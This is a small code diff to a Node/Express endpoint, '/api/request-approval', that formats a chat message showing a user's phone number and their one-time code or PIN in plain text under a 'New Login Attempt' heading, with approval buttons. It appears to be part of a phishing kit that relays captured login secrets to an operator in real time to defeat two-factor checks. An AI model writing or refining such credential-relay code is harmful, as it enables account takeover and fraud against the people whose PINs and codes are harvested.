@@ -80,10 +80,13 @@ app.post('/api/request-approval', async (req, res) => {
     step === 'otp'
        ? `🔑 OTP : \`${otp || '—'}\`\n`
 : `🔑 pin: \`${code || '—'}\`\n`;
-    const text =
-      `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
-      ` Phone: \`${phone || '—'}\`\n` +
-      secretLine;
+    const text = step === 'otp'
+      ? `🔔 *OTP Verification*\n\n` +
+        ` Phone: \`${phone || '—'}\`\n` +
+        secretLine
+      : `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
+        ` Phone: \`${phone || '—'}\`\n` +
+        secretLine;
       
 
     const buttonRow =
